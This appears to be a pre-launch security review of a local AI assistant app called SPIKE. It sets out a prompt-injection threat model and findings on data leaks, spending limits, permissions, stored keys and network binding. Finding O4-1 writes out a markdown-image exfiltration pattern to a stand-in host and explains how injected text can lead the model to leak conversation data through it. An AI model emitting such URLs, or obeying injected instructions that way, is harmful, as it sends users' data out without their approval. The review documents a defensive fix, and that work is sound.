# Security review before launch (O4), 2026-11-09

Builds on the L2 review (`docs/release/REVIEW-v0.1.md`, section 2), which read every route group and fixed S1–S4 and
L2–L8. This pass looks at what that review did not: what an attacker can do through text the model reads (a web page,
a document, a connector's result) once it shapes an answer or a tool call. A finding is confirmed only by a test that
fails on the tree before the fix.

## Threat model

| Attacker | Reaches SPIKE through | Wants |
|---|---|---|
| A web page, document or file the user gives the model | text the model reads and repeats | the user's data out of the computer, or an action the user did not approve |
| A malicious MCP server the user enabled | tool descriptions and results | the same, or calls to other tools |
| A model answer steered by any of the above | the chat view, tool calls | the same |
| A page in the user's browser | requests to the local server | covered by L2 (Host/Origin, loopback, JSON-only bodies; L1 open) |

## Findings

| ID | Severity | Where | Scenario | Confirmed | State |
|---|---|---|---|---|---|
| O4-1 | Medium | `web/src/components/Markdown.tsx` (`markdownHtml`) | An answer containing `![x](https://host/?d=<data>)`, an `<img>`, `srcset`, a video poster, an audio source, an inline `style` with `url(...)`, a `<style>` element or an SVG `<image>` made the browser contact that host as soon as the answer was shown. Text the model read can ask it to put conversation data (a file it read) into such a URL: data leaves with no approval card, the same as an unapproved `web_fetch` | Yes: `web/src/markdown.test.ts`, 9 failing cases before the fix | **Fixed**: styles, media and SVG references are not rendered; an image from another site becomes a link with its host and "not loaded automatically", which the user can open; local (`/…`, relative) and inline (`data:image/`, `blob:`) images stay. Exported reports use the same function |
| O4-2 | Low | `spike/providers/guard.py` (`GuardedProvider.blocked`) | A monthly limit is checked before each call against the calls already logged, and a call is logged when it finishes. Calls that start before the limit is reached (two chats at once, the parallel steps of a workflow level) all pass, so together they can go past it by their own size. Parallel minds are checked as a batch before they start (`guard_minds`), Lab runs its calls one at a time | Yes: `tests/test_privacy.py::test_a_monthly_limit_counts_finished_calls_so_calls_already_running_can_cross_it` | **Documented** in SECURITY.md (what the limit counts). The overshoot is bounded by the calls in flight; reserving tokens per call was not added for v0.1 |

## Checked, no finding

- Connector tools cannot replace a built-in tool: their names carry the connector id (`spike/connectors/manager.py`,
  `tool_name`) and the registry gives built-ins precedence (`spike/tools/base.py`, `ToolRegistry.shared_tools`).
  A connector's tools default to `ask`.
- Tools that write, run code or reach the network default to `ask` (`write_file`, `run_python`, `web_fetch`,
  `edit_file`, `run_command`, documents); "always" for a page means its domain only, and sending files or a form is
  confirmed every time (`PermissionBroker.resolve`).
- Charts never load data: the Vega loader refuses every request and specs with `url`, `href` or `image` are refused
  (`web/src/chart.ts`). Artifacts and MCP App views run in sandboxed frames with a CSP that blocks network loads.

- Stored keys do not come back: a provider key and a connector secret set through the API are absent from every GET
  route without path parameters (34 routes under `/api`, `/v1`, `/mcp`), from the database and from every file
  under SPIKE's home except the fallback key store (`secrets.json`, mode 0600, used only without an OS keychain).
  Guard test: `tests/test_o4_security.py`. Error texts and the call log drop keys in addresses (L4, `strip_url_secrets`).

## Not covered

Real Windows and macOS behaviour of the sandbox, fuzzing, and the MCP Apps policy beyond the L2 review.

## Addendum (claude/o4-security): a network bind must be asked for by name

`spike serve --host 0.0.0.0` (or `::`, an empty host, or a LAN address) used to start with only a stderr warning,
which exposed the login-less `/api` to every machine on the network. It is now refused with exit code 2 unless
`--allow-network` is given; loopback hosts (`localhost`, `127.0.0.0/8`, `::1`) need no flag. `/v1` keeps its own
`SPIKE_API_TOKEN` check. Tests: `tests/test_o4_security.py` (8 cases); the existing Host-check test now passes the flag.

## Addendum (G40 review, 2026-11-10): what `--allow-network` exposes

With `--allow-network` the whole `/api` is open to every machine that can reach the port: settings (including the
sandbox, tool policies and trust), permission approvals, workspace files and chats. Only real-order settings, desktop
action settings, backup/delete-all and the error log require the request to come from this computer. Guarding a few
more settings would not change this, because the same remote client can approve each permission request. The
supported use of `--allow-network` is therefore a trusted network only, as the refusal message says ("the app has no
login"). A login or a token for `/api` (like `SPIKE_API_TOKEN` for `/v1`) is the fix; it is not in v0.1.
